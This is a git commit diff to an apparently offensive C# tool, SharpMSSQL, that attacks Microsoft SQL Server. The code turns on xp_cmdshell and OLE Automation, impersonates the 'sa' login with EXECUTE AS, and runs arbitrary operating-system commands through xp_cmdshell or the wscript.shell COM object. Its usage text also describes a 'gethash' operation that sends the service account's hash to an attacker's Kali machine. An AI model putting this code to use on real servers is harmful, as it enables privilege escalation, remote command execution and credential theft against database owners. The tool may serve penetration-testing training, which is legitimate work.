b1db3c6c26a90f3f0fb48d3b352be254862786a4
pksr <pksr@internal.local>
2024-01-20 22:03:01 +0100

    Update

--- SharpMSSQL/Program.cs
+++ SharpMSSQL/Program.cs
@@ -10,7 +10,7 @@ namespace SQL
         {
 
             String enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
-            String execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"echo Test > C:\\Tools\\file.txt\"';";
+            String execCmd = $"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"{cmd}\"';";
 
 
             SqlCommand command = new SqlCommand(enable_ole, con);
@@ -25,7 +25,7 @@ namespace SQL
 
         static void xp_cmdshell(SqlConnection con, string cmd)
         {
-
+            
             String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
             String execCmd = $"EXEC xp_cmdshell '{cmd}'";
 
@@ -51,33 +51,37 @@ namespace SQL
         static bool impersonation(SqlConnection con)
         {
             String executeas = "EXECUTE AS LOGIN = 'sa';";
-        
-            SqlCommand command = new SqlCommand(executeas, con);
-            SqlDataReader reader = command.ExecuteReader();
-            reader.Close();
-            // Check Who is logged in
-            String querylogin = "SELECT SYSTEM_USER;";
-            command = new SqlCommand(querylogin, con);
-            reader = command.ExecuteReader();
-            reader.Read();
-            if (reader[0].ToString().Contains("sa"))
+            try
             {
+                SqlCommand command = new SqlCommand(executeas, con);
+                SqlDataReader reader = command.ExecuteReader();
+                reader.Close();
+                String querylogin = "SELECT SYSTEM_USER;";
+                command = new SqlCommand(querylogin, con);
+                reader = command.ExecuteReader();
+                reader.Read();
                 Console.ForegroundColor = ConsoleColor.Green;
                 Console.WriteLine("Logged in as: " + reader[0]);
                 Console.ResetColor();
                 reader.Close();
                 return true;
             }
-            else
+            catch (SqlException ex)
             {
-                Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine("Logged in as: " + reader[0]);
-                Console.ResetColor();
-                reader.Close();
+                if (ex.Number == 15517)
+                {
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine("Niestety nie mozesz sie logowac jako sa");
+                    Console.ResetColor();
+                }
+                else
+                {
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine("Error: " + ex.Message);
+                    Console.ResetColor();
+                }
                 return false;
-            }
-
-            
+            }   
  
         }
 
@@ -167,7 +171,8 @@ namespace SQL
             Console.WriteLine("  <dbName>       Database name (required)");
             Console.WriteLine("  <operation>    Operation (required). Supported: 'enum', 'gethash', 'cmd'");
             Console.WriteLine("  gethash <hashServer>   Server to send svc hash (probably your Kali Linux'");
-            Console.WriteLine("  cmd <command>   Command to be executed using xp_cmdshell or OLE");
+            Console.WriteLine("  xp_cmd <command>   Command to be executed using xp_cmdshell");
+            Console.WriteLine("  ole_cmd <command>   Command to be executed using OLE");
         }
 
 
@@ -214,10 +219,10 @@ namespace SQL
                     get_svchash(con, args[3]);
                     con.Close();
                     break;
-                case "cmd":
+                case "xp_cmd":
                     if (args.Length < 4)
                     {
-                        Console.WriteLine("Error: Missing argument. For 'cmd' operation, provide a command to execute.");
+                        Console.WriteLine("Error: Missing argument. For 'xp_cmd' operation, provide a command to execute.");
                         DisplayUsage();
                         return;
                     }
@@ -225,7 +230,25 @@ namespace SQL
                     {
                         Console.WriteLine("Trying to execute command with xp_cmdshell ...");
                         xp_cmdshell(con, args[3]);
-                        Console.WriteLine("Trying to execute command with OLE ... ");
+                    }
+                    else
+                    {
+                        Console.ForegroundColor = ConsoleColor.Red;
+                        Console.WriteLine("Unfortunately you cant impersonate sa.");
+                        Console.ResetColor();
+                    }
+                    con.Close();
+                    break;
+                case "ole_cmd":
+                    if (args.Length < 4)
+                    {
+                        Console.WriteLine("Error: Missing argument. For 'ole_cmd' operation, provide a command to execute.");
+                        DisplayUsage();
+                        return;
+                    }
+                    if (impersonation(con))
+                    {
+                        Console.WriteLine("Trying to execute command with ole_cmdshell ...");
                         ole_cmd(con, args[3]);
                     }
                     else
@@ -234,19 +257,13 @@ namespace SQL
                         Console.WriteLine("Unfortunately you cant impersonate sa.");
                         Console.ResetColor();
                     }
-                    
                     con.Close();
                     break;
-
                 default:
                     Console.WriteLine($"Error: Invalid operation '{operation}'. Supported: 'enum', 'gethash', 'cmd'");
                     DisplayUsage();
                     break;
             }
-
-
-
-
 
             con.Close();
         }
